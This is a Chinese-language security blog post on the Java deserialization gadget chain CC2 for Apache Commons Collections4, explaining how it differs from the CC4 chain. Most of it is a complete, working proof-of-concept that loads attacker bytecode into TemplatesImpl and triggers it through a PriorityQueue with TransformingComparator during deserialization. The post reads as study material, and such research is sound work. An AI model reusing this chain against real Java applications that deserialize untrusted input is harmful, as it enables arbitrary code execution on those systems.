---
title: "Java反序列化CC2链"
date: 2025-06-25T23:24:03+08:00
summary: "Java反序列化CC2链"
url: "/posts/Java反序列化CC2链/"
categories:
  - "javasec"
tags:
  - "javasec"
draft: false
---

参考infer师傅的文章：https://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2%E9%93%BE/

其实本质上和CC4没区别，只不过CC2在CC4的基础上从利用InstantiateTransformer类的基础上改成了直接使用InvokerTransformer，其他没变，也就是CC3的POC2，直接去触发newTransformer()

原有的CC4的POC

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(TrAXFilter.class),
        instantiateTransformer
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

改成直接利用InvokerTransformer

```java
InvokerTransformer<Object,Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});
```

然后把TemplatesImpl类的对象从传入InstantiateTransformer改成直接add进priorityQueue里。

```java
CC4：
priorityQueue.add(1);
CC2：
priorityQueue.add(templates);
```

所以最后的POC

## 最终POC

```java
package SerializeChains.CCchains.CC2;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;
import java.io.*;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class CC2 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        TemplatesImpl templates = new TemplatesImpl();

        //修改_name的值
        setFieldValue(templates,"_name","a");

        //修改_bytecodes的值
        byte[] code = Files.readAllBytes(Paths.get("E:\\java\\JavaSec\\JavaSerialize\\target\\classes\\SerializeChains\\CCchains\\CC3\\POC.class"));
        byte[][] codes = {code};
        setFieldValue(templates,"_bytecodes",codes);

        InvokerTransformer<Object,Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(2);

        setFieldValue(transformingComparator,"transformer",invokerTransformer);

        serialize(priorityQueue);
        unserialize("CC2.txt");
    }
    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{
        Class c = object.getClass();
        Field field = c.getDeclaredField(field_name);
        field.setAccessible(true);
        field.set(object, field_value);
    }
    //定义序列化操作
    public static void serialize(Object object) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CC2.txt"));
        oos.writeObject(object);
        oos.close();
    }

    //定义反序列化操作
    public static void unserialize(String filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }
}

```
